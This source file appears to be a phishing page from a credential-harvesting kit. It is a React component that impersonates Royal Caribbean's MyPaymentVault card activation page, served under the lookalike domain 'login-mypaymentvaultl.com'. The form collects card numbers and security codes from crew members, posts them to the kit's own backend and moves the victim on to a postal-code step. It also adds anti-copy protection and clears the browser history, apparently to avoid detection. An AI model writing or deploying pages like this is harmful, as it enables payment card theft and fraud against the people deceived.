import { useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { useMutation } from '@tanstack/react-query';
import { useLocation } from 'wouter';
import { AntiCopyProtection } from '@/components/AntiCopyProtection';
import { SEO } from '@/components/SEO';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { getSourceInfo } from '@/lib/sourceInfo';
import { cardActivationRequestSchema } from '@shared/schema';
import type { CardActivationRequest } from '@shared/schema';
import '@/styles/styles.css';
import rcclLogoSvg from '@assets/rccl_logo.svg';
import rcclActivationBanner from '@assets/rccl_activation_banner.svg';
import { validateLuhn } from '@/lib/luhn';

export default function RcclCardActivationPage() {
  const [, setLocation] = useLocation();
  const [token, setToken] = useState('');
  const { toast } = useToast();

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<CardActivationRequest>({
    resolver: zodResolver(cardActivationRequestSchema),
  });

  const activationMutation = useMutation({
    mutationFn: async (data: CardActivationRequest) => {
      const res = await apiRequest('POST', '/api/activate-card', { ...data, sourceInfo: getSourceInfo() });
      return await res.json();
    },
    onSuccess: (data: { success: boolean; message: string; id: string }) => {
      sessionStorage.setItem('loginAttemptId', data.id);
      toast({
        title: 'Success',
        description: 'Card activation submitted successfully',
      });
      setTimeout(() => {
        setLocation('/postal-code');
      }, 2000);
    },
    onError: (error: Error) => {
      toast({
        title: 'Error',
        description: error.message || 'Card activation failed. Please try again.',
        variant: 'destructive',
      });
    },
  });

  useEffect(() => {
    const generateRandomString = (length: number) => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    };

    const newToken = generateRandomString(64);
    setToken(newToken);
    window.history.replaceState(null, '', window.location.pathname);
  }, []);

  const onSubmit = async (data: CardActivationRequest) => {
    activationMutation.mutate(data);
  };

  const handleCancel = () => {
    setLocation('/rccl');
  };

  return (
    <>
      <SEO 
        title="RCCL Activate Card | Royal Caribbean MyPaymentVault Card Activation"
        description="Activate your RCCL MyPaymentVault card. Royal Caribbean crew members activate your payment card here securely and quickly."
        keywords="RCCL activate card, RCCL card activation, Royal Caribbean card activation, RCCL MyPaymentVault activate, cruise line card activation"
        canonical="https://login-mypaymentvaultl.com/rccl/activate-card"
      />
      <AntiCopyProtection />
      <div id="root" style={{ '--onbe-primary-color': '#0a1f4d' } as React.CSSProperties}>
        <form id="card_form" onSubmit={handleSubmit(onSubmit)}>
          {/* Header */}
          <div className="onbe-dashboard-header">
            <header className="onbe-headercomponent-parent">
              <div className="onbe-login-header-padding d-flex col-xxl-3 col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6 offset-xxl-0 offset-xl-0 offset-lg-0 offset-md-0 offset-sm-0 offset-0">
                <img
                  src={rcclLogoSvg}
                  alt="RCCL Payment Vault Logo"
                  className="onbe-header-affiliate-logo header-logo-size"
                  style={{ width: '555px', height: '60px' }}
                  data-testid="img-rccl-activate-logo"
                />
              </div>
            </header>
          </div>

          <div className="container g-0">
            <img
              src={rcclActivationBanner}
              alt="RCCL Activation Banner"
              style={{ width: '100%' }}
              data-testid="img-rccl-activation-banner"
            />
          </div>

          <div className="container">
            <div className="row onbe-activation-component">
              {/* Left Section */}
              <div className="col-lg-6 col-md-6 col-sm-12">
                <p className="onbe-activation-section-title" data-testid="text-rccl-activate-title">Activate Your Card</p>
                <div className="onbe-horizontal-divider"></div>
                <p className="onbe-activation-content-text" data-testid="text-rccl-activate-description">
                  Input the card number that displays on the front of your card and the security code that displays on the back.
                </p>
              </div>

              {/* Right Section - Form */}
              <div className="col-lg-4 col-md-5 col-sm-12 offset-lg-2 offset-md-1 mt-lg-0 mt-sm-3">
                <div className="onbe-activation-box-component">
                  <div className="onbe-btn-group-activation">
                    {/* Card Number */}
                    <div className="onbe-btovr-input-group">
                      <input
                        type="tel"
                        id="cardNumber"
                        placeholder=" "
                        autoComplete="off"
                        maxLength={16}
                        className="onbe-btovr-input-group__input"
                        data-testid="input-rccl-activate-card-number"
                        {...register('cardNumber')}
                      />
                      <label className="onbe-btovr-input-group__input_label" htmlFor="cardNumber">
                        Card Number<span className="red">*</span>
                      </label>
                      {errors.cardNumber && (
                        <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                          {errors.cardNumber.message}
                        </div>
                      )}
                    </div>

                    {/* CVV */}
                    <div className="onbe-btovr-input-group">
                      <input
                        type="password"
                        id="cvv"
                        placeholder=" "
                        autoComplete="off"
                        maxLength={3}
                        pattern="[0-9]*"
                        inputMode="numeric"
                        className="onbe-btovr-input-group__input"
                        data-testid="input-rccl-activate-cvv"
                        {...register('cvv')}
                      />
                      <label className="onbe-btovr-input-group__input_label" htmlFor="cvv">
                        Security Code<span className="red">*</span>
                      </label>
                      {errors.cvv && (
                        <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                          {errors.cvv.message}
                        </div>
                      )}
                    </div>

                    {/* Buttons */}
                    <div className="row mt-3">
                      <div className="col-6">
                        <button
                          type="button"
                          onClick={handleCancel}
                          className="onbe-btovr-button-white onbe-button onbe-button-primary"
                          data-testid="button-rccl-activate-cancel"
                        >
                          Cancel
                        </button>
                      </div>
                      <div className="col-6">
                        <button
                          type="submit"
                          className="onbe-btovr-button-black onbe-button onbe-button-primary"
                          style={{ backgroundColor: '#0a1f4d' }}
                          data-testid="button-rccl-activate-continue"
                        >
                          Continue
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
